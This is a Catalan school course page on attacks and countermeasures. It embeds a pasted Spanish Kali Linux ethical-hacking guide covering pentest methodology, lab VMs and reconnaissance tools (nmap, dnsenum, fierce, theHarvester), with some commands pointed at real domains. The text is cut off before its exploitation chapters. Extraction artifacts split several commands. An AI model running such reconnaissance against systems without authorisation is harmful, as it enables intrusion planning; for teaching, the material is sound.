---
layout: default
title: "UT8 — Atacs i contramesures — Seguretat Informàtica | Portal Docent Pepe Cuenca"
course_root: ".."
badge: "2n SMX · Grau Mitjà · UT8 Completa"
prev_url: "../ut07/ut07actividades.html"
prev_label: "⬅️ ✍️ Activitats pràctiques UT7"
next_url: "../ut08/ut08actividades.html"
next_label: "✍️ Activitats pràctiques UT8 ➡️"
---

# 📘 UT8 — Atacs i contramesures (Unitat Completa)

> **💡 📑 Índex d'Apartats d'aquesta Unitat**
> - [**✍️ Activitats pràctiques UT8**](#ut08actividades) (o [obrir en pàgina individual ➡️](./ut08actividades.md) )

---

## ✍️ Activitats pràctiques UT8

> **✍️ Activitat Pràctica 8.1 — 08.01 Ultrasurf**
> Prova el servei d'Ultrasurf i comenta les seves utilitats més interessants.
>
> [https://ultrasurf.us/](https://ultrasurf.us/)

> **✍️ Activitat Pràctica 8.2 — 08.02 Activitats de Repàs**
> Agrupeu-se per parelles i realitzeu el test de repàs de la unitat justificant les respostes i les activitats per comprovar l'aprenentatge fent un resum dels conceptes i mesures més importants que es comenten (Pàgines 223 i 224)

> **✍️ Activitat Pràctica 8.3 — Examen UD7-UD8**
> Realitza l'activitat pràctica seguint les indicacions de l'apartat.

> **✍️ Activitat Pràctica 8.4 — Projecte Final**
> Gasta la ferramenta OBS per realitzar un vídeo tutorial sobre una ferramenta de seguretat de la distribució Kali Linux. Intenta que siga breu i descriptiu (màx. 5 minuts). Inclou una portada amb títol, centre, nom i data.
>
> [https://obsproject.com/](https://obsproject.com/)
> [https://kali-linux.net/](https://kali-linux.net/)
>
> Alternativament, pots crear una infografia amb recomanacions de seguretat enfocada a joves adolescents. Pots agafar de referència els materials:
> [https://www.is4k.es](https://www.is4k.es)
>
> [http://www.criptored.upm.es/intypedia/index.php?lang=es](https://www.canva.com/create/infographics/)
>
> [https://www.canva.com/create/infographics/](https://www.canva.com/create/infographics/)
>
> Hacking con Kali Linux Guía de Prácticas Alonso Eduardo Caballero Quezada Correo electrónico: reydes@gmail.com Sitio web: www.reydes.com Versión 2.7 - Mayo del 2018 “KALI LINUX ™ is a trademark of Offensive Security.” Puede obtener la versión más actual de este documento en: http://www.reydes.com/d/?q=node/2
>
> Sobre el Instructor Alonso Eduardo Caballero Quezada es EXIN Ethical Hacking Foundation Certificate, LPIC-1 Linux Administrator, LPI Linux Essentials Certificate, IT Masters Certificate of Achievement en Network Security Administrator, Hacking Countermeasures, Cisco CCNA Security, Information Security Incident Handling, Digital Forensics, Cybersecurity Management, Cyber Warfare and Terrorism, Enterprise Cyber Security Fundamentals y Phishing Countermeasures. Ha sido instructor en el OWASP LATAM Tour Lima, Perú del año 2014 y expositor en el 0x11 OWASP Perú Chapter Meeting 2016, además de Conferencista en PERUHACK 2014, instructor en PERUHACK2016NOT, y conferencista en 8.8 Lucky Perú 2017.
>
> Cuenta con más de catorce años de experiencia en el área y desde hace diez años labora como consultor e instructor independiente en las áreas de Hacking Ético & Forense Digital. Perteneció por muchos años al grupo internacional de seguridad RareGaZz y al grupo peruano de seguridad PeruSEC. Ha dictado cursos presenciales y virtuales en Ecuador, España, Bolivia y Perú, presentándose también constantemente en exposiciones enfocadas a Hacking Ético, Forense Digital, GNU/Linux y Software Libre. Su correo electrónico es ReYDeS@gmail.com y su página personal está en: http://www.ReYDeS.com.
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Temario Material Necesario ................................................................................................................................ 4
>
> - Metodología de una Prueba de Penetración ..................................................................................... 5
> - Máquinas Vulnerables ....................................................................................................................... 7
> - Introducción a Kali Linux ................................................................................................................... 9
> - Shell Scripting .................................................................................................................................. 12
> - Capturar Información ....................................................................................................................... 14
> - Descubrir el Objetivo ....................................................................................................................... 25
> - Enumerar el Objetivo ....................................................................................................................... 32
> - Mapear Vulnerabilidades ................................................................................................................. 44
> - Explotar el Objetivo ......................................................................................................................... 50
> - Atacar Contraseñas ....................................................................................................................... 72
> - Demostración de Explotación & Post Explotación ......................................................................... 79
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 3
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Material Necesario Para desarrollar adecuadamente el presente curso, se sugiere al participante instalar y configurar las máquinas virtuales de Kali Linux y Metasploitable 2 utilizando VirtualBox VMware Player, Hyper-V, u otro software para virtualización.
>
> • Kali Linux Vm 32 Bit [Zip] Enlace: https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-i386.zip • Kali Linux Vm 64 Bit [Zip] Enlace: https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip • Metasploitable 2. Enlace: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ • Software para Virtualización VirtualBox Enlace: https://www.virtualbox.org/wiki/Downloads Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 4
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 1. Metodología de una Prueba de Penetración
>
> Una Prueba de Penetración (Penetration Testing) es el proceso utilizado para realizar una evaluación o auditoría de seguridad de alto nivel. Una metodología define un conjunto de reglas, prácticas, procedimientos y métodos a seguir e implementar durante la realización de cualquier programa para auditoría en seguridad de la información. Una metodología para pruebas de penetración define una hoja de ruta con ideas útiles y prácticas comprobadas, las cuales deben ser manejadas cuidadosamente para poder evaluar correctamente los sistemas de seguridad.
>
> 1.1 Tipos de Pruebas de Penetración: Existen diferentes tipos de Pruebas de Penetración, las más comunes y aceptadas son las Pruebas de Penetración de Caja Negra (Black-Box), las Pruebas de Penetración de Caja Blanca (White-Box) y las Pruebas de Penetración de Caja Gris (Grey-Box).
>
> • Prueba de Caja Negra. No se tienen ningún tipo de conocimiento anticipado sobre la red de la organización. Un ejemplo de este escenario es cuando se realiza una prueba externa a nivel web, y está es realizada únicamente con el detalle de una URL o dirección IP proporcionado al equipo de pruebas. Este escenario simula el rol de intentar irrumpir en el sitio web o red de la organización. Así mismo simula un ataque externo realizado por un atacante malicioso.
>
> • Prueba de Caja Blanca. El equipo de pruebas cuenta con acceso para evaluar las redes, y se le ha proporcionado los de diagramas de la red, además de detalles sobre el hardware, sistemas operativos, aplicaciones, entre otra información antes de realizar las pruebas. Esto no iguala a una prueba sin conocimiento, pero puede acelerar el proceso en gran magnitud, con el propósito de obtener resultados más precisos. La cantidad de conocimiento previo permite realizar las pruebas contra sistemas operativos específicos, aplicaciones y dispositivos residiendo en la red, en lugar de invertir tiempo enumerando aquello lo cual podría posiblemente estar en la red. Este tipo de prueba equipara una situación donde el atacante puede tener conocimiento completo sobre la red interna.
>
> • Prueba de Caja Gris El equipo de pruebas simula un ataque realizado por un miembro de la organización inconforme o descontento. El equipo de pruebas debe ser dotado con los privilegios adecuados a nivel de usuario y una cuenta de usuario, además de permitirle acceso a la red interna.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 5
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 1.2 Evaluación de Vulnerabilidades y Prueba de Penetración. Una evaluación de vulnerabilidades es el proceso de evaluar los controles de seguridad interna y externa, con el propósito de identificar amenazas las cuales impliquen una seria exposición para los activos de la empresa.
>
> La principal diferencia entre una evaluación de vulnerabilidades y una prueba de penetración, radica en el hecho de las pruebas de penetración van más allá del nivel donde únicamente de identifican las vulnerabilidades, y van hacia el proceso de su explotación, escalado de privilegios, y mantener el acceso en el sistema objetivo. Mientras una evaluación de vulnerabilidades proporciona una amplia visión sobre las fallas existentes en los sistemas, pero sin medir el impacto real de estas vulnerabilidades para los sistemas objetivos de la evaluación 1.3 Metodologías de Pruebas de Seguridad Existen diversas metodologías open source, o libres las cuales tratan de dirigir o guiar los requerimientos de las evaluaciones en seguridad. La idea principal de utilizar una metodología durante una evaluación, es ejecutar diferentes tipos de pruebas paso a paso, para poder juzgar con una alta precisión la seguridad de los sistemas. Entre estas metodologías se enumeran las siguientes
>
> • Open Source Security Testing Methodology Manual (OSSTMM) http://www.isecom.org/research/ • The Penetration Testing Execution Standard (PTES) http://www.pentest-standard.org/index.php/Main_Page • Penetration Testing Framework http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html • OWASP Testing Guide https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents • Technical Guide to Information Security Testing and Assessment (SP 800-115) https://csrc.nist.gov/publications/detail/sp/800-115/final • Information Systems Security Assessment Framework (ISSAF) [No disponible] http://www.oissg.org/issaf Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 6
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 2. Máquinas Vulnerables
>
> 2.1 Maquinas Virtuales Vulnerables Nada puede ser mejor a tener un laboratorio donde practicar los conocimientos adquiridos sobre Pruebas de Penetración. Esto aunado a la facilidad proporciona por el software para realizar virtualización, lo cual hace bastante sencillo crear una máquina virtual vulnerable personalizada o descargar desde Internet una máquina virtual vulnerable.
>
> A continuación se detalla un breve listado de algunas máquinas virtuales creadas específicamente conteniendo vulnerabilidades, las cuales pueden ser utilizadas para propósitos de entrenamiento y aprendizaje en temas relacionados a la seguridad, hacking ético, pruebas de penetración, análisis de vulnerabilidades, forense digital, etc.
>
> • Metasploitable 3 Enlace de descarga: https://github.com/rapid7/metasploitable3 • Metasploitable2 Enlace de descarga: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ • Metasploitable Enlace de descarga: https://www.vulnhub.com/entry/metasploitable-1,28/ Vulnhub proporciona materiales que permiten a cualquier interesado ganar experiencia práctica en seguridad digital, software de computadora y administración de redes. Incluye un extenso catálogo de maquinas virtuales y “cosas” las cuales se pueden de manera legal; romper, “hackear”, comprometer y explotar.
>
> Sitio Web: https://www.vulnhub.com/ En el centro de evaluación de Microsoft se puede encontrar diversos productos para Windows, incluyendo sistemas operativos factibles de ser descargados y evaluados por un tiempo limitado. Sitio Web: https://www.microsoft.com/en-us/evalcenter/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 7
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 2.2 Introducción a Metasploitable2 Metasploitable 2 es una máquina virtual basada en GNU/Linux creada intencionalmente para ser vulnerable. Esta máquina virtual puede ser utilizada para realizar entrenamientos en seguridad, evaluar herramientas de seguridad, y practicar técnicas comunes en pruebas de penetración.
>
> Esta máquina virtual nunca debe ser expuesta a una red poco fiable, se sugiere utilizarla en modos NAT o Host-only. Imagen 2-1. Consola presentada al iniciar Metasploitable2 Enlace de descarga: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 8
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 3. Introducción a Kali Linux
>
> Kali Linux es una distribución basada en GNU/Linux Debian, destinado a auditorias de seguridad y pruebas de penetración avanzadas. Kali Linux contiene cuentos de herramientas, las cuales están destinadas hacia varias tareas en seguridad de la información, como pruebas de penetración, investigación en seguridad, forense de computadoras, e ingeniería inversa. Kali Linux ha sido desarrollado, fundado y mantenido por Offensive Security, una compañía de entrenamiento en seguridad de la información.
>
> Kali Linux fue publicado en 13 de marzo del año 2013, como una reconstrucción completa de BackTrack Linux, aderiéndose completamente con los estándares del desarrollo de Debian. Este documento proporciona una excelente guía práctica para utilizar las herramientas más populares incluidas en Kali Linux, las cuales abarcan las bases para realizar pruebas de penetración. Así mismo este documento es una excelente fuente de conocimiento tanto para profesionales inmersos en el tema, como para los novatos.
>
> El Sitio Oficial de Kali Linux es: http
>
> s ://www.kali.org/ 3.1 Características de Kali Linux Kali Linux es una completa reconstrucción de BackTrack Linux, y se adhiere completamente a los estándares de desarrollo de Debian. Se ha puesto en funcionamiento toda una nueva infraestructura, todas las herramientas han sido revisadas y empaquetadas, y se utiliza ahora Git para el VCS.
>
> • Incluye más de 600 herramientas para pruebas de penetración • Es Libre y siempre lo será • Árbol Git Open Source • Cumplimiento con FHS (Filesystem Hierarchy Standard) • Amplio soporte para dispositivos inalámbricos • Kernel personalizado, con parches para inyección. • Es desarrollado en un entorno seguro • Paquetes y repositorios están firmados con GPG • Soporta múltiples lenguajes • Completamente personalizable • Soporte ARMEL y ARMHF Kali Linux está específicamente diseñado para las necesidades de los profesionales en pruebas de penetración, y por lo tanto toda la documentación asume un conocimiento previo, y familiaridad con el sistema operativo Linux en general.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 9
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 3.2 Descargar Kali Linux Nunca descargar las imágenes de Kali Linux desde otro lugar diferente a las fuentes oficiales. Siempre asegurarse de verificar las sumas de verificación SHA256 de loas archivos descargados, comparándolos contra los valores oficiales. Podría ser fácil para una entidad maliciosa modificar una instalación de Kali Linux conteniendo “exploits” o malware y hospedarlos de manera no oficial.
>
> Kali Linux puede ser descargado como imágenes ISO para computadoras basadas en Intel, esto para arquitecturas de 32-bits o 64 bits. También puede ser descargado como máquinas virtuales previamente construidas para VMware Player, VirtualBox y Hyper-V. Finalmente también existen imágenes para la arquitectura ARM, los cuales están disponibles para una amplia diversidad de dispositivos.
>
> Kali Linux puede ser descargado desde la siguiente página: https://www.kali.org/downloads/ 3.3 Instalación de Kali Linux Kali Linux puede ser instalado en un un disco duro como cualquier distribución GNU/Linux, también puede ser instalado y configurado para realizar un arranque dual con un Sistema Operativo Windows, de la misma manera puede ser instalado en una unidad USB, o instalado en un disco cifrado.
>
> Se sugiere revisar la información detallada sobre las diversas opciones de instalación para Kali Linux, en la siguiente página: http://docs.kali.org/category/installation 3.4 Cambiar la Contraseña del root Por una buena práctica de seguridad se recomienda cambiar la contraseña por defecto asignada al usuario root. Esto dificultará a los usuarios maliciosos obtener acceso hacia sistema con esta clave por defecto.
>
> ```bash
> # passwd root
> ```
>
> Enter new UNIX password: Retype new UNIX password: [*] La contraseña no será mostrada mientras sea escrita y está deberá ser ingresada dos veces. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 10
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 3.5 Iniciando Servicios de Red Kali Linux incluye algunos servicios de red, lo cuales son útiles en diversos escenarios, los cuales están deshabilitadas por defecto. Estos servicios son, HTTP, Mestaploit, PostgreSQL, OpenVAS y SSH.
>
> De requerirse iniciar el servicio HTTP se debe ejecutar el siguiente comando
>
> ```bash
> # service apache2 start
> ```
>
> Estos servicios también pueden iniciados y detenidos desde el menú: Applications -> Kali Linux -> System Services. Kali Linux proporciona documentación oficial sobre varios de sus aspectos y características. La documentación está en constante trabajo y progreso. Esta documentación puede ser ubicada en la siguiente página
>
> https://docs.kali.org/ Imagen 3-1. Escritorio de Kali Linux Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 11
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 3.6 Herramientas de Kali Linux Kali Linux contiene una gran cantidad de herramientas obtenidas desde diferente fuentes relacionadas al campo de la seguridad y forense. En el siguiente sitio web se proporciona una lista de todas estas herramientas y una referencia rápida de las mismas.
>
> https://tools.kali.org/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 12
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 4. Shell Scripting
>
> El Shell es un interprete de comandos. Más a únicamente una capa aislada entre el Kernel del sistema operativo y el usuario, es también un poderoso lenguaje de programación. Un programa shell llamado un script, es un herramienta fácil de utilizar para construir aplicaciones “pegando” llamadas al sistema, herramientas, utilidades y archivos binarios. El Shell Bash permite automatizar una acción, o realizar tareas repetitivas las cuales consumen una gran cantidad de tiempo.
>
> Para la siguiente práctica se utilizará un sitio web donde se publican listados de proxys. Utilizando comandos del shell bash, se extraerán las direcciones IP y puertos de los Proxys hacia un archivo.
>
> ```bash
> # wget http://www.us-proxy.org/
> # grep "<tr><td>" index.html | cut -d ">" -f 3,5 | cut -d "<" -f 1,2 | sed
> ```
>
> 's/<\/td>/:/g' Imagen 4-1. Listado de las irecciones IP y Puertos de los Proxys. Guía Avanzada de Scripting Bash: http://tldp.org/LDP/abs/html/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 13
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 5. Capturar Información
>
> En esta fase se intenta recolectar la mayor cantidad de información posible sobre el objetivo en evaluación, como posibles nombres de usuarios, direcciones IP, servidores de nombre, y otra información relevante. Durante esta fase cada fragmento de información obtenida es importante y no debe ser subestimada. Tener en consideración, la recolección de una mayor cantidad de información, generará una mayor probabilidad para un ataque satisfactorio.
>
> El proceso donde se captura la información puede ser dividido de dos maneras. La captura de información activa y la captura de información pasiva. En el primera forma se recolecta información enviando tráfico hacia la red objetivo, como por ejemplo realizar ping ICMP, y escaneos de puertos TCP/UDP. Para el segundo caso se obtiene información sobre la red objetivo utilizando servicios o fuentes de terceros, como por ejemplo motores de búsqueda como Google y Bing, o utilizando redes sociales como Facebook o LinkedIn.
>
> 5.1 Fuentes Públicas Existen diversos recursos públicos en Internet , los cuales pueden ser utilizados para recolectar información sobre el objetivo en evaluación. La ventaja de utilizar este tipo de recursos es la no generación de tráfico directo hacia el objetivo, de esta manera se minimizan la probabilidades de ser detectados. Algunas fuentes públicas de referencia son
>
> • The Wayback Machine: http://archive.org/web/web.php • Netcraft: http://searchdns.netcraft.com/ • ServerSniff http://serversniff.net/index.php • Robtex https://www.robtex.com/ • CentralOps https://centralops.net/co/ 5.2 Capturar Documentos Se utilizan herramientas para recolectar información o metadatos desde los documentos disponibles Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 14
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital en el sitio web del objetivo en evaluación. Para este propósito se puede utilizar también un motor de búsqueda como Google. Metagoofil http://www.edge-security.com/metagoofil.php Metagoofil es una herramienta diseñada par capturar información mediante la extracción de metadatos desde documentos públicos (pdf, doc, xls, ppt, odp, ods, docx, pptx, xlsx) correspondientes a la organización objetivo.
>
> Metagoofil realizará una búsqueda en Google para identificar y descargar documentos hacia el disco local, y luego extraerá los metadatos con diferentes librerías como Hachoir, PdfMiner y otros. Con los resultados se generará un reporte con los nombres de usuarios, versiones y software, y servidores o nombres de las máquinas, las cuales ayudarán a los profesionales en pruebas de penetración en la fase para la captura de información.
>
> ```bash
> # metagoofil
> # metagoofil -d nmap.org -t pdf -l 200 -n 10 -o /tmp/ -f
> ```
>
> /tmp/resultados_mgf.html La opción “-d” define el dominio a buscar. La opción “-t” define el tipo de archivo a descargar (pdf, doc, xls, ppt, odp, ods, docx, pptx, xlsx) La opción “-l” limita los resultados de búsqueda (por defecto a 200). La opción “-n” limita los archivos a descargar.
>
> La opción “-o” define un directorio de trabajo (La ubicación para guardar los archivos descargados). La opción “-f” define un archivo de salida. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 15
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 5-1. Parte de la información de Software y correos electrónico de los documentos analizados 5.3 Información de los DNS DNSenum https://code.google.com/archive/p/dnsenum/ El propósito de DNSenum es capturar tanta información como sea posible sobre un dominio.
>
> Realizando actualmente las siguientes operaciones: Obtener las direcciones IP del host (Registro A). Obtener los servidores de nombres. Obtener el registro MX. Realizar consultas AXFR sobre servidores de nombres y versiones de BIND. Obtener nombres adicionales y subdominios mediante Google (“allinurl -www site:dominio”). Fuerza bruta a subdominios de un archivo, puede también realizar recursividad sobre subdominios los cuales tengan registros NS. Calcular los rangos de red de dominios en clase y realizar consultas whois sobre ellos. Realizar consultas inversas sobre rangos de red (clase C y/o rangos de red). Escribir hacia un archivo domain_ips.txt los bloques IP.
>
> ```bash
> # cd /usr/share/dnsenum/
> # dnsenum --enum hackthissite.org
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 16
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “--enum” es un atajo equivalente a la opción “--thread 5 -s 15 -w”. Donde: La opción “--threads” define el número de hilos que realizarán las diferentes consultas.
>
> La opción “-s” define el número máximo de subdominios a ser arrastrados desde Google. La opción “-w” realiza consultas Whois sobre los rangos de red de la clase C. Imagen 5-2. Parte de los resultados obtenidos por dnsenum fierce https://www.aldeid.com/wiki/Fierce Fierce es una escaner semi ligero para realizar una enumeración, la cual ayude a los profesionales en pruebas de penetración, a localizar espacios IP y nombres de host no continuos para dominios específicos, utilizando cosas como DNS, Whois y ARIN. En realidad se trata de un precursor de las Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 17
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital herramientas activas para pruebas como; nmap, unicornscan, nessus, nikto, etc, pues todos estos requieren se conozcan el espacio de direcciones IP por los cuales se buscará. Fierce no realiza explotació, y no escanea indiscriminadamente todas Internet. Está destinada específicamente a localizar objetivos, ya sea dentro y fuera de la red corporativa. Dado el hecho utiliza principalmente DNS, frecuentemente se encontrará redes mal configuradas, las cuales exponen el espacio de direcciones internas.
>
> ```bash
> # fierce --help
> # fierce -dnsserver d.ns.buddyns.com -dns hackthissite.org -wordlist
> ```
>
> /usr/share/dnsenum/dns.txt -file /tmp/resultado_fierce.txt La opción “-dnsserver” define el uso de un servidor DNS en particular para las consultas del nombre del host. La opción “-dns” define el dominio a escanear. La opción “-wordlist” define una lista de palabras a utilizar para descubrir subdominios.
>
> La opción “-file” define un archivo de salida. [*] La herramienta dnsenum incluye una lista de palabras “dns.txt”, las cual puede ser utilizada con cualquier otra herramienta que la requiera, como fierce en este caso. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 18
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 5-3. Ejecución de fierce y la búsqueda de subdominios. dmitry https://linux.die.net/man/1/dmitry Dmitry (Deepmagic Information Gathering Tool) es una programa en línea de comando para Linux, el cual permite capturar tanta información como sea posible sobre un host, desde un simple Whois hasta reportes del tiempo de funcionamiento o escaneo de puertos.
>
> ```bash
> # dmitry
> # dmitry -w -e -n -s [Dominio] -o /tmp/resultado_dmitry.txt
> ```
>
> La opción “-w” permite realizar una consulta whois a la dirección IP de un host. La opción “-e” permite realizar una búsqueda de todas las posibles direcciones de correo electrónico. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 19
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “-n” intenta obtener información desde netcraft sobre un hot. La opción “-s” permite realizar una búsqueda de posibles subdominios. La opción “-o” permite definir un nombre de archivos en el cual guardar el resultado.
>
> Imagen 5-4. Información de Netcraft y de los subdominios encontrados. Aunque existe una opción en Dmitry, la cual permitiría obtener información sobre el dominio desde el sitio web de Netcraft, ya no es funcional. Pero la información puede ser obtenida directamente desde el sitio web de Netcraft.
>
> http://searchdns.netcraft.com/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 20
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 5-5. Información obtenida por netcraft. 5.4 Información de la Ruta traceroute https://linux.die.net/man/8/traceroute Traceroute rastrea la ruta tomada por los paquetes desde una red IP, en su camino hacia un host especificado. Este utiliza el campo TTL (Time To Live) del protocolo IP, e intenta provocar una respuesta ICMP TIME_EXCEEDED desde cada pasarela a través de la ruta hacia el host.
>
> El único parámetro requerido es el nombre o dirección IP del host de destino. La longitud del paquete opcional es el tamaño total del paquete de prueba (por defecto 60 bytes para IPv4 y 80 para IPv6). El tamaño especificado puede ser ignorado en algunas situaciones o incrementado hasta un valor mínimo.
>
> La versión de traceroute en los sistemas GNU/Linux utiliza por defecto paquetes UDP.
>
> ```bash
> # traceroute --help
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 21
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # traceroute [Dirección_IP]
> ```
>
> Imagen 5-6. traceroute en funcionamiento. (Los nombres de host y direcciones IP han sido censurados conscientemente) tcptraceroute https://linux.die.net/man/1/tcptraceroute tcptraceroute es una implementación de la herramienta traceroute, la cual utiliza paquetes TCP para trazar la ruta hacia el host objetivo. Traceroute tradicionalmente envía ya sea paquetes UDP o paquetes ICMP ECHO con un TTL a uno, e incrementa el TTL hasta el destino sea alcanzado.
>
> ```bash
> # tcptraceroute --help
> # tcptraceroute [Dirección_IP]
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 22
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 5-7. Resultado obtenidos por tcptraceroute. (Los nombres de host y direcciones IP han sido censurados conscientemente) 5.5 Utilizar Motores de Búsqueda theHarvester https://github.com/laramies/theHarvester theHarvester es una herramientas para obtener nombres de dominio, direcciones de correo electrónico, hosts virtuales, banners de puertos abiertos, y nombres de empleados desde diferentes fuentes públicas (motores de búsqueda, servidores de llaves pgp).
>
> Las fuentes son; Treatcrowd, crtsh, google, googleCSW, google-profiles, bing, bingapi, dogpile, pgp, linkein, vhost, twitter, googleplus, yahoo, baidu, y shodan.
>
> ```bash
> # theharvester
> # theharvester -d nmap.org -l 200 -b bing
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 23
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “-d” define el dominio a buscar o nombre de la empresa. La opción “-l” limita el número de resultados a trabajar (bing va de 50 en 50 resultados). La opción “-b” define la fuente de datos (google, bing, bingapi, pgp, linkedin, google-profiles, people123, jigsaw, all).
>
> Imagen 5-8. Correos electrónicos y nombres de host obtenidos mediante Bing Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 24
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 6. Descubrir el Objetivo
>
> Después de recolectar la mayor cantidad de información sobre la red objetivo desde fuentes externas; como motores de búsqueda; es necesario descubrir ahora las máquinas activas en el objetivo de evaluación. Es decir encontrar cuales son las máquinas disponibles o en funcionamiento, caso contrario no será posible continuar analizándolas, y se deberá continuar con la siguientes máquinas.
>
> También se debe obtener indicios sobre el tipo y versión del sistema operativo utilizado por el objetivo. Toda esta información será de mucha ayuda para el proceso donde se deben mapear las vulnerabilidades. 6.1 Identificar la máquinas del objetivo nmap https://nmap.org/ Nmap “Network Mapper” o Mapeador de Puertos, es una herramienta open source para la exploración de redes y auditorías de seguridad. Nmap utiliza paquetes IP en bruto de maneras novedosas para determinar cuales host están disponibles en la red, cuales servicios (nombre y versión) estos hosts ofrecen, cuales sistemas operativos (y versión de SO) están ejecutándo, cual tipo de firewall y filtros de paquetes utilizan. Ha sido diseñado para escanear velozmente redes de gran envergadura, consecuentemente funciona también host únicos.
>
> ```bash
> # nmap -h
> # nmap -sn [Dirección_IP]
> # nmap -n -sn 192.168.0.0/24
> ```
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 25
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital La opción “-sn” le indica a nmap a no realizar un escaneo de puertos después del descubrimiento del host, y solo imprimir los hosts disponibles que respondieron al escaneo.
>
> La opción “-n” le indica a nmap a no realizar una resolución inversa al DNS sobre las direcciones IP activas que encuentre. Nota: Cuando un usuario privilegiado intenta escanear objetivos sobre una red ethernet local, se utilizan peticiones ARP, a menos sea especificada la opción “--send-ip”, la cual indica a nmap a enviar paquetes mediante sockets IP en bruto, en lugar de tramas ethernet de bajo nivel.
>
> Imagen 6-1. Escaneo a un Rango de red con Nmap nping https://nmap.org/nping/ Nping es una herramienta open source para la generación de paquetes de red, análisis de respuesta y realizar mediciones en el tiempo de respuesta. Nping puede generar paquetes de red de para una diversidad de protocolos, permitiendo a los usuarios, permitiendo a los usuarios un completo control Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 26
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital sobre las cabeceras de los protocolos. Mientras Nping puede ser utilizado como una simple utilidad
>
> ```bash
> ping para detectar host activos, también puede ser utilizada como un generador de paquetes en bruto
> ```
>
